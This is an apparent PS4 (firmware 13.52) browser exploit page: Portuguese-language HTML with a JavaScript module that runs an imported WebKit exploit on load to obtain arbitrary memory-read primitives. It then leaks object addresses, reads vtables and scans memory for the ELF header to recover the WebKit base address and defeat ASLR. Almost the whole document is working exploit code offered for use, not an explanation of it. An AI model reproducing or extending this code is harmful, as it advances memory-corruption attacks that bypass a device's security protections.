
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<title>PS4 13.52 — Micro Scanner</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; background: #0b0f19; color: #c8ced8;
    font: 12px/1.4 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column; align-items: center;
    gap: 6px; padding: 8px; }
  h1 { color: #fff; font-size: 14px; text-align: center; }
  #status { font-size: 12px; font-weight: 700; color: #fff; text-align: center; }
  .panel { background: #111827; border: 1px solid #1f2937; border-radius: 6px;
    padding: 8px; width: 95%; max-width: 720px; }
  .row { display: flex; justify-content: space-between; padding: 2px 0;
    font-family: monospace; font-size: 10px; border-bottom: 1px solid #1f2937; }
  .row:last-child { border-bottom: none; }
  .label { color: #9ca3af; } .value { color: #60a5fa; font-weight: bold; }
  #log { width: 95%; max-width: 720px; height: 200px; background: #111827;
    border: 1px solid #1f2937; border-radius: 6px; padding: 5px;
    overflow-y: auto; font-family: monospace; font-size: 9px; color: #9fb1c3; }
  #log .ok { color: #4ade80; } #log .err { color: #f87171; }
  #log .found { color: #a78bfa; font-weight: bold; }
  #log .warn { color: #fbbf24; }
  .ctrl-btn { padding: 6px 10px; border-radius: 5px; border: none;
    background: #1e40af; color: #fff; cursor: pointer; font-size: 10px; font-weight: 600; }
  .ctrl-btn:hover { background: #2563eb; }
  .ctrl-btn:disabled { background: #374151; opacity: 0.4; cursor: not-allowed; }
  .ctrl-btn.success { background: #15803d; }
  .ctrl-btn.gold { background: #b45309; }
  .ctrl-btn.danger { background: #991b1b; }
  .section { color: #9ca3af; font-size: 8px; text-transform: uppercase; margin: 2px 0 1px; }
  .hint { color: #6b7280; font-size: 9px; text-align: center; max-width: 720px; }
  input[type="text"] {
    background: #1f2937; border: 1px solid #374151; color: #fff;
    border-radius: 3px; padding: 4px 5px; font-family: monospace; font-size: 10px;
    width: 90px;
  }
  .flex-row { display: flex; gap: 5px; flex-wrap: wrap; justify-content: center; align-items: center; }
</style>
</head>
<body>
<h1>PS4 13.52 — Micro Scanner</h1>
<div id="status">Inicializando...</div>

<div class="section">Valores</div>
<div class="panel" id="leaks">
  <div class="row"><span class="label">__ps5NativeCtor:</span><span class="value" id="l-ctor">---</span></div>
  <div class="row"><span class="label">vtable ptr (0x10):</span><span class="value" id="l-vt">---</span></div>
  <div class="row"><span class="label">vtable[0]:</span><span class="value" id="l-vt0">---</span></div>
  <div class="row"><span class="label">Min vtable addr:</span><span class="value" id="l-min">---</span></div>
  <div class="row"><span class="label">Base:</span><span class="value" id="l-base">---</span></div>
</div>

<div class="hint">
  Micro Scan foca na faixa provavel da base (2-5MB abaixo do min vtable).<br>
  v5: OOM-safe, reutiliza 1 int64, log 20 linhas.
</div>

<div class="section">Acoes</div>
<div class="flex-row">
  <button class="ctrl-btn success" onclick="scanVtable()">🔎 Ler VTable</button>
  <button class="ctrl-btn gold" onclick="analyzeVtable()">📊 VTable Analyzer</button>
  <button class="ctrl-btn danger" onclick="microScan()">🔬 Micro Scan (estimada)</button>
  <button class="ctrl-btn" onclick="scanCtorRange()">🎯 Scan Faixa Ctor</button>
  <button class="ctrl-btn" onclick="scanAnyMagic()">🧪 Qualquer Magic</button>
  <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar</button>
</div>

<div class="section">Offset Customizado</div>
<div class="flex-row">
  <input type="text" id="custom-off" placeholder="0x3A888" value="0x3A888">
  <button class="ctrl-btn" onclick="testCustomOffset()">Testar</button>
</div>

<div id="log"></div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const logBox = document.getElementById("log");
  const status = document.getElementById("status");
  function log(msg, cls) {
    const line = document.createElement("div");
    line.className = cls || "info";
    line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
    while (logBox.children.length > 20) logBox.removeChild(logBox.firstChild);
  }
  window.clearLog = function() { logBox.innerHTML = ""; log("Log limpo."); };

  let ctorInt64 = null;
  let vtablePtr = null;
  let vtable0 = null;
  let minVtableAddr = null;
  let running = false;

  function setRunning(v) {
    running = v;
    document.querySelectorAll('.ctrl-btn').forEach(b => { b.disabled = v; });
  }

  function numToInt64(num) {
    const low  = (num % 0x100000000) >>> 0;
    const hi   = (Math.floor(num / 0x100000000)) >>> 0;
    return new int64(low, hi);
  }

  function int64ToNum(addr) {
    return addr.hi * 0x100000000 + addr.low;
  }

  function isValidPtr(addr) {
    const n = int64ToNum(addr);
    return n >= 0x800000000 && n < 0x900000000;
  }

  function safeRead4(p, addr) {
    try { return p.read4(addr); } catch (e) { return null; }
  }
  function safeRead8(p, addr) {
    try { return p.read8(addr); } catch (e) { return null; }
  }

  // OOM-safe: modifica addr in-place
  function subInPlace(addr, val) {
    if (addr.low < val) {
      addr.low = (0x100000000 + addr.low) - val;
      addr.hi = (addr.hi - 1) >>> 0;
    } else {
      addr.low = (addr.low - val) >>> 0;
    }
  }

  function cloneAddr(addr) {
    return new int64(addr.low, addr.hi);
  }

  // ============================================================
  // LER VTABLE
  // ============================================================
  window.scanVtable = async function() {
    const p = window.p;
    if (!p) { log("p nao disponivel", "err"); return; }
    log("Lendo vtable...", "warn");
    const textArea = document.createElement("textarea");
    const objAddr = p.leakval(textArea);
    const vtPtr = safeRead8(p, objAddr.add32(0x10));
    if (!vtPtr) { log("Falha vtable ptr", "err"); return; }
    vtablePtr = vtPtr;
    document.getElementById("l-vt").textContent = "0x" + vtPtr.toString(16);
    const v0 = safeRead8(p, vtPtr);
    if (!v0) { log("Falha vtable[0]", "err"); return; }
    vtable0 = v0;
    document.getElementById("l-vt0").textContent = "0x" + v0.toString(16);
    log("vt=0x" + vtPtr.toString(16) + " v0=0x" + v0.toString(16), "ok");
  };

  // ============================================================
  // VTABLE ANALYZER
  // ============================================================
  window.analyzeVtable = async function() {
    const p = window.p;
    if (!p || !vtablePtr) { log("Clique Ler VTable primeiro", "err"); return; }
    log("=== VTable Analyzer ===", "warn");

    let minAddr = null;
    let maxAddr = null;
    let validCount = 0;
    const ptrs = [];

    for (let i = 0; i < 64; i++) {
      const slot = safeRead8(p, vtablePtr.add32(i * 8));
      if (!slot) continue;
      const n = int64ToNum(slot);
      if (n >= 0x800000000 && n < 0x900000000) {
        validCount++;
        ptrs.push({ idx: i, num: n });
        if (minAddr === null || n < minAddr) minAddr = n;
        if (maxAddr === null || n > maxAddr) maxAddr = n;
      }
    }

    log("Validas: " + validCount + "/64", "ok");
    if (minAddr !== null) {
      log("Min: 0x" + minAddr.toString(16), "ok");
      log("Max: 0x" + maxAddr.toString(16), "ok");
      log("Range: " + ((maxAddr - minAddr) / 0x100000).toFixed(1) + "MB", "ok");
      log("Est. base: 0x" + (minAddr - 0x500000).toString(16) + "..0x" + minAddr.toString(16), "warn");
      minVtableAddr = numToInt64(minAddr);
      document.getElementById("l-min").textContent = "0x" + minVtableAddr.toString(16);
    }
    for (let i = 0; i < Math.min(6, ptrs.length); i++) {
      log("[" + ptrs[i].idx + "] 0x" + ptrs[i].num.toString(16), "info");
    }
  };

  // ============================================================
  // MICRO SCAN — foca na faixa estimada (2-5MB abaixo do min)
  // ============================================================
  window.microScan = async function() {
    if (running) return;
    const p = window.p;
    if (!p || !minVtableAddr) { log("Clique VTable Analyzer primeiro", "err"); return; }
    setRunning(true);

    const minNum = int64ToNum(minVtableAddr);
    // Faixa: min - 5MB ate min
    const startNum = minNum - 0x500000; // 5MB abaixo
    const endNum = minNum;
    const step = 0x1000; // 4KB steps

    log("=== Micro Scan ===", "warn");
    log("Faixa: 0x" + startNum.toString(16) + " .. 0x" + endNum.toString(16), "info");
    log("(" + ((endNum - startNum) / 0x100000).toFixed(1) + "MB, step 4KB)", "info");

    const addr = numToInt64(endNum);
    addr.low = addr.low & 0xFFFFF000; // align 4KB
    let tested = 0;

    try {
      while (int64ToNum(addr) >= startNum) {
        const magic = safeRead4(p, addr);
        if (magic !== null) {
          const magicU = magic >>> 0;
          if (magicU === 0x464c457f) {
            log("✅ ELF BASE! 0x" + addr.toString(16), "found");
            foundBase(addr, "micro-elf");
            setRunning(false); return;
          }
          // Sony PRX magic? (alguns PRX comecam com 0x4F15 ou similar)
          if (magicU === 0x4F15 || magicU === 0x50520000 || magicU === 0x7F454C46) {
            log("🟡 POSSIVEL BASE! magic=0x" + magicU.toString(16) + " @ 0x" + addr.toString(16), "warn");
          }
        }
        tested++;
        subInPlace(addr, step);
        if (tested % 256 === 0) {
          log("Prog: " + tested + ", 0x" + addr.toString(16), "info");
          await new Promise(r => setTimeout(r, 5));
        }
      }
    } catch (e) { log("Exc: " + e.message, "err"); }

    log("Micro Scan terminou. Nenhum ELF encontrado.", "err");
    setRunning(false);
  };

  // ============================================================
  // SCAN FAIXA DO CTOR — base deve estar abaixo do ctor
  // ============================================================
  window.scanCtorRange = async function() {
    if (running) return;
    const p = window.p;
    if (!p || !ctorInt64) { log("Ctor nao disponivel", "err"); return; }
    setRunning(true);

    const ctorNum = int64ToNum(ctorInt64);
    // Faixa: ctor - 20MB ate ctor
    const startNum = ctorNum - 0x1400000;
    const endNum = ctorNum;
    const step = 0x1000;

    log("=== Scan Faixa Ctor ===", "warn");
    log("Faixa: 0x" + startNum.toString(16) + " .. 0x" + endNum.toString(16), "info");

    const addr = numToInt64(endNum);
    addr.low = addr.low & 0xFFFFF000;
    let tested = 0;

    try {
      while (int64ToNum(addr) >= startNum) {
        const magic = safeRead4(p, addr);
        if (magic !== null && (magic >>> 0) === 0x464c457f) {
          log("✅ ELF BASE! 0x" + addr.toString(16), "found");
          foundBase(addr, "ctor-range");
          setRunning(false); return;
        }
        tested++;
        subInPlace(addr, step);
        if (tested % 256 === 0) {
          log("Prog: " + tested + ", 0x" + addr.toString(16), "info");
          await new Promise(r => setTimeout(r, 5));
        }
      }
    } catch (e) { log("Exc: " + e.message, "err"); }
    log("Scan Ctor terminou.", "err");
    setRunning(false);
  };

  // ============================================================
  // SCAN QUALQUER MAGIC — mostra TODOS os magic encontrados
  // ============================================================
  window.scanAnyMagic = async function() {
    if (running) return;
    const p = window.p;
    if (!p || !minVtableAddr) { log("Clique VTable Analyzer primeiro", "err"); return; }
    setRunning(true);

    const minNum = int64ToNum(minVtableAddr);
    const startNum = minNum - 0x500000;
    const endNum = minNum;
    const step = 0x1000;

    log("=== Scan Qualquer Magic ===", "warn");
    log("Mostrando todos os magic != 0 na faixa...", "info");

    const addr = numToInt64(endNum);
    addr.low = addr.low & 0xFFFFF000;
    let tested = 0;
    let foundCount = 0;

    try {
      while (int64ToNum(addr) >= startNum) {
        const magic = safeRead4(p, addr);
        if (magic !== null) {
          const magicU = magic >>> 0;
          if (magicU !== 0 && magicU !== 0xFFFFFFFF) {
            log("Magic 0x" + magicU.toString(16).padStart(8,"0") + " @ 0x" + addr.toString(16), "warn");
            foundCount++;
            if (foundCount > 15) {
              log("(mais resultados omitidos...)", "info");
              break;
            }
          }
        }
        tested++;
        subInPlace(addr, step);
        if (tested % 512 === 0) await new Promise(r => setTimeout(r, 5));
      }
    } catch (e) { log("Exc: " + e.message, "err"); }
    log("Scan terminado. " + foundCount + " magic encontrados.", "info");
    setRunning(false);
  };

  function foundBase(addr, method) {
    window.__webkitBase = cloneAddr(addr);
    document.getElementById("l-base").textContent = "0x" + addr.toString(16);
    status.textContent = "BASE: 0x" + addr.toString(16);
    status.style.color = "#4ade80";
    if (vtable0) {
      const off = int64ToNum(vtable0) - int64ToNum(addr);
      log("Offset vtable[0] = 0x" + off.toString(16) + " (" + off + ")", "found");
    }
    if (ctorInt64) {
      const off = int64ToNum(ctorInt64) - int64ToNum(addr);
      log("Offset ctor = 0x" + off.toString(16) + " (" + off + ")", "found");
    }
    log("METHOD: " + method, "found");
  }

  window.testCustomOffset = async function() {
    const p = window.p;
    if (!p || !ctorInt64) { log("Primitivas nao prontas", "err"); return; }
    const raw = document.getElementById("custom-off").value;
    const off = parseInt(raw, 16);
    if (isNaN(off)) { log("Offset invalido", "err"); return; }

    const base = numToInt64(int64ToNum(ctorInt64) - off);
    base.low = base.low & 0xFFFFC000;
    log("Offset: 0x" + off.toString(16) + " => base 0x" + base.toString(16), "warn");

    const magic = safeRead4(p, base);
    if (magic !== null) {
      const magicU = magic >>> 0;
      log("Magic: 0x" + magicU.toString(16).padStart(8,"0"), magicU === 0x464c457f ? "found" : "info");
      if (magicU === 0x464c457f) {
        foundBase(base, "custom");
      }
    } else {
      log("Read falhou", "err");
    }
  };

  // BOOTSTRAP
  log("Carregando...", "ok");
  status.textContent = "Executando exploit...";
  establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
    .then(carrier => {
      const prim = installWindowP(carrier, { onEvent: (tag, detail) => log(tag + ": " + detail, "info"), promote: true });
      window.__carrier = carrier; window.__prim = prim; window.p = prim; window.int64 = int64;
      log("Exploit pronto!", "ok");
      const ctor = globalThis.__ps5NativeCtor;
      if (typeof ctor === "number") {
        ctorInt64 = numToInt64(ctor);
        document.getElementById("l-ctor").textContent = "0x" + ctorInt64.toString(16);
        log("Ctor=0x" + ctorInt64.toString(16), "ok");
      }
      status.textContent = "Pronto — clique em 'Ler VTable'";
      status.style.color = "#60a5fa";
    })
    .catch(err => { log("FALHA: " + err.message, "err"); status.textContent = "Falha"; status.style.color = "#f87171"; });
</script>
</body>
</html>
